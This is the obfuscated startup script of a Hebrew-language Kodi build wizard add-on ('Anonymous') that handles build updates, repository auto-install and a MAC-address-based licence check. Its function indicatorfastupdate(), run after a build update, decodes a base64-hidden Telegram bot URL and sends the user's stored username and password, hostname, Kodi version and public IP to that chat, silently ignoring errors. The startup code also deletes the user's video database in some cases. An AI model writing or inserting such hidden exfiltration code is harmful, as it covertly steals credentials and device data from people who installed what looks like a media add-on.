# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob #line:21
import shutil #line:22
import urllib2 ,urllib #line:23
import re #line:24
import uservar #line:25
import time #line:26
import json #line:27
import speedtest #line:28
from shutil import copyfile #line:29
from datetime import date ,datetime ,timedelta #line:30
from resources .libs import extract ,downloader ,downloaderbg ,downloaderwiz ,notify ,loginit ,debridit ,traktit ,maintenance ,skinSwitch ,uploadLog ,wizard as wiz #line:31
ADDON_ID =uservar .ADDON_ID #line:33
ADDONTITLE =uservar .ADDONTITLE #line:34
ADDON =wiz .addonId (ADDON_ID )#line:35
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:36
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:37
ADDONID =wiz .addonInfo (ADDON_ID ,'id')#line:38
DIALOG =xbmcgui .Dialog ()#line:39
DP =xbmcgui .DialogProgress ()#line:40
DP2 =xbmcgui .DialogProgressBG ()#line:41
HOME =xbmc .translatePath ('special://home/')#line:42
PROFILE =xbmc .translatePath ('special://profile/')#line:43
KODIHOME =xbmc .translatePath ('special://xbmc/')#line:44
ADDONS =os .path .join (HOME ,'addons')#line:45
KODIADDONS =os .path .join (KODIHOME ,'addons')#line:46
USERDATA =os .path .join (HOME ,'userdata')#line:47
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:48
PACKAGES =os .path .join (ADDONS ,'packages')#line:49
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:50
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:51
ICON =os .path .join (ADDONPATH ,'icon.png')#line:52
ART =os .path .join (ADDONPATH ,'resources','art')#line:53
SKIN =xbmc .getSkinDir ()#line:54
BUILDNAME =wiz .getS ('buildname')#line:55
DEFAULTSKIN =wiz .getS ('defaultskin')#line:56
DEFAULTNAME =wiz .getS ('defaultskinname')#line:57
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:58
BUILDVERSION =wiz .getS ('buildversion')#line:59
BUILDLATEST =wiz .getS ('latestversion')#line:60
BUILDCHECK =wiz .getS ('lastbuildcheck')#line:61
DISABLEUPDATE =wiz .getS ('disableupdate')#line:62
AUTOCLEANUP =wiz .getS ('autoclean')#line:63
AUTOCACHE =wiz .getS ('clearcache')#line:64
AUTOPACKAGES =wiz .getS ('clearpackages')#line:65
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:66
AUTOFEQ =wiz .getS ('autocleanfeq')#line:67
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:68
TRAKTSAVE =wiz .getS ('traktlastsave')#line:69
REALSAVE =wiz .getS ('debridlastsave')#line:70
LOGINSAVE =wiz .getS ('loginlastsave')#line:71
INSTALLMETHOD =wiz .getS ('installmethod')#line:72
KEEPTRAKT =wiz .getS ('keeptrakt')#line:73
KEEPREAL =wiz .getS ('keepdebrid')#line:74
KEEPLOGIN =wiz .getS ('keeplogin')#line:75
INSTALLED =wiz .getS ('installed')#line:76
EXTRACT =wiz .getS ('extract')#line:77
EXTERROR =wiz .getS ('errors')#line:78
NOTIFY =wiz .getS ('notify')#line:79
NOTEDISMISS =wiz .getS ('notedismiss')#line:80
NOTEID =wiz .getS ('noteid')#line:81
NOTIFY2 =wiz .getS ('notify2')#line:82
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:83
NOTEID2 =wiz .getS ('noteid2')#line:84
NOTIFY3 =wiz .getS ('notify3')#line:85
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:86
NOTEID3 =wiz .getS ('noteid3')#line:87
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else HOME #line:88
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:89
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:90
NOTEID2 =0 if NOTEID2 ==""else int (NOTEID2 )#line:91
NOTEID3 =0 if NOTEID3 ==""else int (NOTEID3 )#line:92
AUTOFEQ =int (AUTOFEQ )if AUTOFEQ .isdigit ()else 1 #line:93
TODAY =date .today ()#line:94
TOMORROW =TODAY +timedelta (days =1 )#line:95
TWODAYS =TODAY +timedelta (days =2 )#line:96
THREEDAYS =TODAY +timedelta (days =3 )#line:97
ONEWEEK =TODAY +timedelta (days =7 )#line:98
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:99
EXCLUDES =uservar .EXCLUDES #line:100
SPEEDFILE =speedtest .SPEEDFILE #line:101
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:102
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:103
NOTIFICATION =uservar .NOTIFICATION #line:104
NOTIFICATION2 =uservar .NOTIFICATION2 #line:105
NOTIFICATION3 =uservar .NOTIFICATION3 #line:106
ENABLE =uservar .ENABLE #line:107
UNAME =speedtest .UNAME #line:108
HEADERMESSAGE =uservar .HEADERMESSAGE #line:109
AUTOUPDATE =uservar .AUTOUPDATE #line:110
WIZARDFILE =uservar .WIZARDFILE #line:111
AUTOINSTALL =uservar .AUTOINSTALL #line:112
REPOID =uservar .REPOID #line:113
REPOADDONXML =uservar .REPOADDONXML #line:114
REPOZIPURL =uservar .REPOZIPURL #line:115
REPOID18 =uservar .REPOID18 #line:116
REPOADDONXML18 =uservar .REPOADDONXML18 #line:117
REPOZIPURL18 =uservar .REPOZIPURL18 #line:118
REQUESTSID =uservar .REQUESTSID #line:120
REQUESTSXML =uservar .REQUESTSXML #line:121
REQUESTSURL =uservar .REQUESTSURL #line:122
COLOR1 =uservar .COLOR1 #line:126
COLOR2 =uservar .COLOR2 #line:127
TMDB_NEW_API =uservar .TMDB_NEW_API #line:128
WORKING =True if wiz .workingURL (SPEEDFILE )==True else False #line:129
FAILED =False #line:130
xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:131
AddonID ='plugin.program.Anonymous'#line:133
packagesdir =xbmc .translatePath (os .path .join ('special://home/addons/packages',''))#line:134
thumbnails =xbmc .translatePath ('special://home/userdata/Thumbnails')#line:135
dialog =xbmcgui .Dialog ()#line:136
setting =xbmcaddon .Addon ().getSetting #line:137
iconpath =xbmc .translatePath (os .path .join ('special://home/addons/'+AddonID ,'icon.png'))#line:138
notify_mode =setting ('notify_mode')#line:139
auto_clean =setting ('startup.cache')#line:140
filesize_thumb =int (setting ('filesizethumb_alert'))#line:142
total_size2 =0 #line:145
total_size =0 #line:146
count =0 #line:147
def disply_hwr ():#line:149
   try :#line:150
    OOO00OOO0O000OO00 =tmdb_list (TMDB_NEW_API )#line:151
    OO00O0O0000OO0OOO =str ((getHwAddr ('eth0'))*OOO00OOO0O000OO00 )#line:152
    OO000O00O0OOOOO00 =(OO00O0O0000OO0OOO [1 ]+OO00O0O0000OO0OOO [2 ]+OO00O0O0000OO0OOO [5 ]+OO00O0O0000OO0OOO [7 ])#line:159
    O000OOO00O0OOOO00 =(ADDON .getSetting ("action"))#line:160
    wiz .setS ('action',str (OO000O00O0OOOOO00 ))#line:162
   except :pass #line:163
def getHwAddr (O000OO000O000OOOO ):#line:164
   import subprocess ,time #line:165
   O000000O0OO0O000O ='windows'#line:166
   if xbmc .getCondVisibility ('system.platform.android'):#line:167
       O000000O0OO0O000O ='android'#line:168
   if xbmc .getCondVisibility ('system.platform.android'):#line:169
     O000OOOOO0OOO0OOO =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:170
     O0OO000OO00OO0OOO =re .compile ('link/ether (.+?) brd').findall (str (O000OOOOO0OOO0OOO ))#line:172
     O00OOOO000OO00OO0 =0 #line:173
     for OOO00OO00OO00O000 in O0OO000OO00OO0OOO :#line:174
      if O0OO000OO00OO0OOO !='00:00:00:00:00:00':#line:175
          OO0O0O000000OO00O =OOO00OO00OO00O000 #line:176
          O00OOOO000OO00OO0 =O00OOOO000OO00OO0 +int (OO0O0O000000OO00O .replace (':',''),16 )#line:177
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:179
       O0O0OOO0OO0OOO0O0 =0 #line:180
       O00OOOO000OO00OO0 =0 #line:181
       O00OOO0O0OOOO00O0 =[]#line:182
       OO00OOO0000O00OO0 =os .popen ("getmac").read ()#line:183
       OO00OOO0000O00OO0 =OO00OOO0000O00OO0 .split ("\n")#line:184
       for O00O00OOO00OO0OOO in OO00OOO0000O00OO0 :#line:186
            O0OOOOO0O0OO0OOOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',O00O00OOO00OO0OOO ,re .I )#line:187
            if O0OOOOO0O0OO0OOOO :#line:188
                O0OO000OO00OO0OOO =O0OOOOO0O0OO0OOOO .group ().replace ('-',':')#line:189
                O00OOO0O0OOOO00O0 .append (O0OO000OO00OO0OOO )#line:190
                O00OOOO000OO00OO0 =O00OOOO000OO00OO0 +int (O0OO000OO00OO0OOO .replace (':',''),16 )#line:193
   else :#line:195
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:196
   try :#line:213
    return O00OOOO000OO00OO0 #line:214
   except :pass #line:215
def decode (OO000O0OOOO000000 ,OO000OOOO00OO0000 ):#line:216
    import base64 #line:217
    O00OO0OOO0O000000 =[]#line:218
    if (len (OO000O0OOOO000000 ))!=4 :#line:220
     return 10 #line:221
    OO000OOOO00OO0000 =base64 .urlsafe_b64decode (OO000OOOO00OO0000 )#line:222
    for OOOOO00O00O000OOO in range (len (OO000OOOO00OO0000 )):#line:224
        O00O0O00O0O0OOO0O =OO000O0OOOO000000 [OOOOO00O00O000OOO %len (OO000O0OOOO000000 )]#line:225
        O00OOO00OO0OOOO0O =chr ((256 +ord (OO000OOOO00OO0000 [OOOOO00O00O000OOO ])-ord (O00O0O00O0O0OOO0O ))%256 )#line:226
        O00OO0OOO0O000000 .append (O00OOO00OO0OOOO0O )#line:227
    return "".join (O00OO0OOO0O000000 )#line:228
def tmdb_list (O0OO00OO0OO00OO00 ):#line:229
    O0O0OOOO0O00O00O0 =decode ("7643",O0OO00OO0OO00OO00 )#line:232
    return int (O0O0OOOO0O00O00O0 )#line:235
def u_list (O0O0O0OOO00O0OO0O ):#line:236
    from math import sqrt #line:238
    OO0O000O0OOO0O000 =tmdb_list (TMDB_NEW_API )#line:239
    O000O000O000O0000 =str ((getHwAddr ('eth0'))*OO0O000O0OOO0O000 )#line:241
    OO00OO0O0OOOO00OO =int (O000O000O000O0000 [1 ]+O000O000O000O0000 [2 ]+O000O000O000O0000 [5 ]+O000O000O000O0000 [7 ])#line:242
    O0OOO000000O00000 =(ADDON .getSetting ("pass"))#line:244
    O00O0OOO0O0OOO0OO =(str (round (sqrt ((OO00OO0O0OOOO00OO *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:249
    if '.'in O00O0OOO0O0OOO0OO :#line:250
     O00O0OOO0O0OOO0OO =(str (round (sqrt ((OO00OO0O0OOOO00OO *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:251
    if O0OOO000000O00000 ==O00O0OOO0O0OOO0OO :#line:252
      OOOOOOOOO000000O0 =O0O0O0OOO00O0OO0O #line:254
    else :#line:256
       if STARTP ()and STARTP2 ()=='ok':#line:257
         return O0O0O0OOO00O0OO0O #line:259
       OOOOOOOOO000000O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:260
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:261
       sys .exit ()#line:262
    return OOOOOOOOO000000O0 #line:263
try :#line:264
   disply_hwr ()#line:265
except :#line:266
   pass #line:267
def dis_or_enable_addon (O0OOOOO00O00OO000 ,O0OO0000O0OO00O00 ,enable ="true"):#line:268
    import json #line:269
    O000O0O0OOOO00O0O ='"%s"'%O0OOOOO00O00OO000 #line:270
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO00O00OO000 )and enable =="true":#line:271
        logging .warning ('already Enabled')#line:272
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0OOOOO00O00OO000 )#line:273
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0OOOOO00O00OO000 )and enable =="false":#line:274
        return xbmc .log ("### Skipped %s, reason = not installed"%O0OOOOO00O00OO000 )#line:275
    else :#line:276
        O00OOO000O00OOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O000O0O0OOOO00O0O ,enable )#line:277
        OOO0OO000O000OO0O =xbmc .executeJSONRPC (O00OOO000O00OOOOO )#line:278
        OOOOO000O0OO000O0 =json .loads (OOO0OO000O000OO0O )#line:279
        if enable =="true":#line:280
            xbmc .log ("### Enabled %s, response = %s"%(O0OOOOO00O00OO000 ,OOOOO000O0OO000O0 ))#line:281
        else :#line:282
            xbmc .log ("### Disabled %s, response = %s"%(O0OOOOO00O00OO000 ,OOOOO000O0OO000O0 ))#line:283
    if O0OO0000O0OO00O00 =='auto':#line:284
     return True #line:285
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:286
def indicatorfastupdate ():#line:287
       try :#line:288
          import json #line:289
          wiz .log ('FRESH MESSAGE')#line:290
          O0OOOO0O000OO0O0O =(ADDON .getSetting ("user"))#line:291
          OO0000000O0OO00O0 =(ADDON .getSetting ("pass"))#line:292
          O0OOOO000000OOO00 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:293
          OOO0O0OOO0OO0O0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:295
          O0O0O0OOO000OO0O0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:296
          OO0OOO00OOO0000O0 =str (json .loads (O0O0O0OOO000OO0O0 )['ip'])#line:297
          OO00000000O0000O0 =O0OOOO0O000OO0O0O #line:298
          O00OO000OO0O0OOO0 =OO0000000O0OO00O0 #line:299
          import socket #line:300
          O0O0O0OOO000OO0O0 =urllib2 .urlopen (OOO0O0OOO0OO0O0OO .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO00000000O0000O0 +' - '+O00OO000OO0O0OOO0 +' - '+O0OOOO000000OOO00 +' - '+OO0OOO00OOO0000O0 ).readlines ()#line:301
       except :pass #line:303
def skindialogsettind18 ():#line:304
	try :#line:305
		OO0000000OO0OO000 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:306
		OO0O0OO0OO0000OOO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:307
		copyfile (OO0000000OO0OO000 ,OO0O0OO0OO0000OOO )#line:308
	except :pass #line:309
def checkidupdate ():#line:310
				wiz .setS ("notedismiss","true")#line:312
				O00O0OOO0OO0O0OO0 =wiz .workingURL (NOTIFICATION )#line:313
				OO0OO0000O0O000O0 =" Kodi Premium"#line:315
				O0O0O0O0OOOOOO0O0 =wiz .checkBuild (OO0OO0000O0O000O0 ,'gui')#line:316
				O00OO000OOO0O00OO =OO0OO0000O0O000O0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:317
				if not wiz .workingURL (O0O0O0O0OOOOOO0O0 )==True :return #line:318
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:319
				OO00OOOOO0O0OO0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O00OO000OOO0O00OO )#line:322
				try :os .remove (OO00OOOOO0O0OO0OO )#line:323
				except :pass #line:324
				if 'google'in O0O0O0O0OOOOOO0O0 :#line:326
				   OOOOO0O0000OO000O =googledrive_download (O0O0O0O0OOOOOO0O0 ,OO00OOOOO0O0OO0OO ,DP2 ,wiz .checkBuild (OO0OO0000O0O000O0 ,'filesize'))#line:327
				else :#line:330
				  downloaderbg .download3 (O0O0O0O0OOOOOO0O0 ,OO00OOOOO0O0OO0OO ,DP2 )#line:331
				xbmc .sleep (100 )#line:332
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:333
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:335
				extract .all2 (OO00OOOOO0O0OO0OO ,HOME ,DP2 )#line:337
				DP2 .close ()#line:338
				wiz .defaultSkin ()#line:339
				wiz .lookandFeelData ('save')#line:340
				wiz .kodi17Fix ()#line:341
				if KODIV >=18 :#line:342
					skindialogsettind18 ()#line:343
				xbmc .executebuiltin ("ReloadSkin()")#line:344
				indicatorfastupdate ()#line:345
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:346
				debridit .debridIt ('restore','all')#line:347
				traktit .traktIt ('restore','all')#line:348
				if INSTALLMETHOD ==1 :OO00000OO000O00OO =1 #line:349
				elif INSTALLMETHOD ==2 :OO00000OO000O00OO =0 #line:350
				else :DP2 .close ()#line:351
def checkUpdate ():#line:357
	O00O000OO0O0O0O0O =wiz .getS ('buildname')#line:358
	OOOOO0O00O0000O00 =wiz .getS ('buildversion')#line:359
	OOO0OOOO0OO0OOOOO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:360
	O0O0OO0OOO000O0O0 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O00O000OO0O0O0O0O ).findall (OOO0OOOO0OO0OOOOO )#line:361
	if len (O0O0OO0OOO000O0O0 )>0 :#line:362
		O00000O00OOO000OO =O0O0OO0OOO000O0O0 [0 ][0 ]#line:363
		OO00OO0OOOO000O00 =O0O0OO0OOO000O0O0 [0 ][1 ]#line:364
		O00O0O00O00O0O0OO =O0O0OO0OOO000O0O0 [0 ][2 ]#line:365
		wiz .setS ('latestversion',O00000O00OOO000OO )#line:366
		if O00000O00OOO000OO >OOOOO0O00O0000O00 :#line:367
			if DISABLEUPDATE =='false':#line:368
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OOOOO0O00O0000O00 ,O00000O00OOO000OO ),xbmc .LOGNOTICE )#line:369
				notify .updateWindow (O00O000OO0O0O0O0O ,OOOOO0O00O0000O00 ,O00000O00OOO000OO ,OO00OO0OOOO000O00 ,O00O0O00O00O0O0OO )#line:370
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OOOOO0O00O0000O00 ,O00000O00OOO000OO ),xbmc .LOGNOTICE )#line:371
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OOOOO0O00O0000O00 ,O00000O00OOO000OO ),xbmc .LOGNOTICE )#line:372
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:373
wiz .log ("[Auto Update Wizard] Started",xbmc .LOGNOTICE )#line:408
if AUTOUPDATE =='Yes':#line:409
	input =(ADDON .getSetting ("autoupdate"))#line:410
	xbmc .executebuiltin ("UpdateLocalAddons")#line:411
	xbmc .executebuiltin ("UpdateAddonRepos")#line:412
	wiz .wizardUpdate ('startup')#line:413
	checkUpdate ()#line:415
else :wiz .log ("[Auto Update Wizard] Not Enabled",xbmc .LOGNOTICE )#line:417
wiz .log ("[Auto Install Repo] Started",xbmc .LOGNOTICE )#line:421
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=17 and KODIV <18 :#line:422
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:424
	workingxml =wiz .workingURL (REPOADDONXML )#line:425
	if workingxml ==True :#line:426
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML ),'addon',ret ='version',attrs ={'id':REPOID })#line:427
		if len (ver )>0 :#line:428
			installzip ='%s-%s.zip'%(REPOID ,ver [0 ])#line:429
			workingrepo =wiz .workingURL (REPOZIPURL +installzip )#line:430
			if workingrepo ==True :#line:431
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:432
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:433
				lib =os .path .join (PACKAGES ,installzip )#line:434
				try :os .remove (lib )#line:435
				except :pass #line:436
				downloader .download (REPOZIPURL +installzip ,lib ,DP )#line:437
				extract .all (lib ,ADDONS ,DP )#line:438
				try :#line:439
					f =open (os .path .join (ADDONS ,REPOID ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:440
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID })#line:441
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID ,'icon.png'))#line:442
				except :#line:443
					pass #line:444
				if KODIV >=17 :wiz .addonDatabase (REPOID ,1 )#line:445
				DP .close ()#line:446
				xbmc .sleep (500 )#line:447
				wiz .forceUpdate (True )#line:448
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:449
				xbmc .executebuiltin ("ReloadSkin()")#line:450
				xbmc .executebuiltin ("ActivateWindow(home)")#line:451
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:452
				xbmc .Player ().play (f_play ,windowed =False )#line:453
			else :#line:455
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:456
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:457
		else :#line:458
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:459
	else :#line:460
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:461
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:462
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:463
elif os .path .exists (os .path .join (ADDONS ,REPOID )):wiz .log ("[Auto Install Repo] Repository already installed")#line:464
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REPOID ))and KODIV >=18 :#line:467
	workingxml =wiz .workingURL (REPOADDONXML18 )#line:468
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]אנא המתן...[/COLOR]'%COLOR2 )#line:469
	if BUILDNAME =="":#line:470
		try :#line:471
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db"))#line:472
		except :#line:473
				pass #line:474
	if workingxml ==True :#line:475
		ver =wiz .parseDOM (wiz .openURL (REPOADDONXML18 ),'addon',ret ='version',attrs ={'id':REPOID18 })#line:476
		if len (ver )>0 :#line:477
			installzip ='%s-%s.zip'%(REPOID18 ,ver [0 ])#line:478
			workingrepo =wiz .workingURL (REPOZIPURL18 +installzip )#line:479
			if workingrepo ==True :#line:480
				DP .create (ADDONTITLE ,'מוריד ממשק התקנה חדשני, אנא המתן....','','Please Wait')#line:481
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:482
				lib =os .path .join (PACKAGES ,installzip )#line:483
				try :os .remove (lib )#line:484
				except :pass #line:485
				downloader .download (REPOZIPURL18 +installzip ,lib ,DP )#line:486
				extract .all (lib ,ADDONS ,DP )#line:487
				try :#line:488
					f =open (os .path .join (ADDONS ,REPOID18 ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:489
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REPOID18 })#line:490
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REPOID18 ,'icon.png'))#line:491
				except :#line:492
					pass #line:493
				if KODIV >=17 :wiz .addonDatabase (REPOID18 ,1 )#line:494
				DP .close ()#line:495
				xbmc .sleep (500 )#line:496
				wiz .forceUpdate (True )#line:497
				wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:498
				xbmc .executebuiltin ("ReloadSkin()")#line:499
				xbmc .executebuiltin ("ActivateWindow(home)")#line:500
				f_play =(os .path .join (ADDONPATH ,'resources','victory.mp4'))#line:501
				xbmc .Player ().play (f_play ,windowed =False )#line:502
			else :#line:504
				wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:505
				wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%workingrepo ,xbmc .LOGERROR )#line:506
		else :#line:507
			wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:508
	else :#line:509
		wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:510
		wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:511
elif not AUTOINSTALL =='Yes':wiz .log ("[Auto Install Repo] Not Enabled",xbmc .LOGNOTICE )#line:514
elif os .path .exists (os .path .join (ADDONS ,REPOID18 )):wiz .log ("[Auto Install Repo] Repository already installed")#line:515
if AUTOINSTALL =='Yes'and not os .path .exists (os .path .join (ADDONS ,REQUESTSID )):#line:518
	workingxml =wiz .workingURL (REQUESTSXML )#line:519
	if workingxml ==True :#line:521
		ver =wiz .parseDOM (wiz .openURL (REQUESTSXML ),'addon',ret ='version',attrs ={'id':REQUESTSID })#line:522
		if len (ver )>0 :#line:523
			installzip ='%s-%s.zip'%(REQUESTSID ,ver [0 ])#line:524
			workingrepo =wiz .workingURL (REQUESTSURL +installzip )#line:525
			if workingrepo ==True :#line:526
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:528
				lib =os .path .join (PACKAGES ,installzip )#line:529
				try :os .remove (lib )#line:530
				except :pass #line:531
				downloaderbg .download4 (REQUESTSURL +installzip ,lib ,DP2 )#line:532
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:533
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:534
				extract .all2 (lib ,ADDONS ,DP2 )#line:535
				try :#line:536
					f =open (os .path .join (ADDONS ,REQUESTSID ,'addon.xml'),mode ='r');g =f .read ();f .close ()#line:537
					name =wiz .parseDOM (g ,'addon',ret ='name',attrs ={'id':REQUESTSID })#line:538
					wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,name [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,REQUESTSID ,'icon.png'))#line:539
				except :#line:540
					pass #line:541
				if KODIV >=17 :wiz .addonDatabase (REQUESTSID ,1 )#line:542
				DP2 .close ()#line:543
				xbmc .sleep (500 )#line:544
				wiz .forceUpdate (True )#line:545
				wiz .kodi17Fix ()#line:546
def setuname ():#line:550
    O0OO0OOOOO0OO00OO =''#line:551
    OO0O00OO0OO0000O0 =xbmc .Keyboard (O0OO0OOOOO0OO00OO ,'הכנס שם משתמש')#line:552
    OO0O00OO0OO0000O0 .doModal ()#line:553
    if OO0O00OO0OO0000O0 .isConfirmed ():#line:554
           O0OO0OOOOO0OO00OO =OO0O00OO0OO0000O0 .getText ()#line:555
           wiz .setS ('user',str (O0OO0OOOOO0OO00OO ))#line:556
def STARTP2 ():#line:557
	if BUILDNAME ==" Kodi Premium":#line:558
		O000O000O000OOOO0 =(ADDON .getSetting ("user"))#line:559
		OO00O00O0O0OO000O =(UNAME )#line:560
		OOO0O00OOOO0OO0OO =urllib2 .urlopen (OO00O00O0O0OO000O )#line:561
		O0O0O0OO0O000000O =OOO0O00OOOO0OO0OO .readlines ()#line:562
		OO00O0000000000OO =0 #line:563
		for OO0OOO00OOOO00OOO in O0O0O0OO0O000000O :#line:564
			if OO0OOO00OOOO00OOO .split (' ==')[0 ]==O000O000O000OOOO0 or OO0OOO00OOOO00OOO .split ()[0 ]==O000O000O000OOOO0 :#line:565
				OO00O0000000000OO =1 #line:566
				break #line:567
		if OO00O0000000000OO ==0 :#line:568
			OOO000O0O000O0O00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]ברוכים הבאים לקודי אנונימוס"%(COLOR2 ),"נא להכניס את שם המשתמש שלכם[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:570
			if OOO000O0O000O0O00 :#line:572
				ADDON .openSettings ()#line:573
				sys .exit ()#line:574
			else :#line:575
				sys .exit ()#line:576
		return 'ok'#line:580
def skinWIN ():#line:583
	idle ()#line:584
